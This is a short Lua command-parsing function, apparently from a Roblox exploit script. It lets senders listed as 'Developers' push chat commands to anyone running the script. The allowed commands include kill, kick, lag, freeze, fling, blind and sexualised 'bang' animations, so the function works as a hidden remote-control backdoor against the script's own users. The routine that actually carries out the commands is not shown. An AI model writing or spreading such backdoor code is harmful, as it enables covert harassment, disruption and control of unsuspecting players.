local function ParseCommand(cmdString, senderName)
    if not cmdString or cmdString == "" then return end
    
    local parts = {}
    for word in cmdString:gmatch("%S+") do
        table.insert(parts, word)
    end
    if #parts < 2 then return end
    local cmd = parts[1]:lower()
    local targetName = parts[2]
    local value = parts[3]
    
    if cmd == "notf" then
        value = table.concat(parts, " ", 3)
    end

    if not Developers[senderName] then return end

    local resolvedTarget = FindPlayer(targetName)
    if not resolvedTarget or resolvedTarget ~= LocalPlayer then
        return
    end

    local allowedCmds = {
        "kill", "loopkill", "kick", "freeze", "bring", "speedall", "jumpall",
        "autojump", "fling", "sky", "underground", "stopsky", "jail",
        "legback", "legface", "walkto", "spin", "infjump", "sit",
        "loopsit", "fire", "blind", "tprand", "flingz", "castle", 
        "lag", "notf", "notfstop", 
        "bangback", "bangface", "bangcomb", "bangv2body", "bangv2face", "bangstopall",
        "bloxfruit", "mm2", "market", "garden", "house"
    }
    if table.find(allowedCmds, cmd) then
        ExecuteCommand(cmd, targetName, value, senderName, resolvedTarget)
    end
end

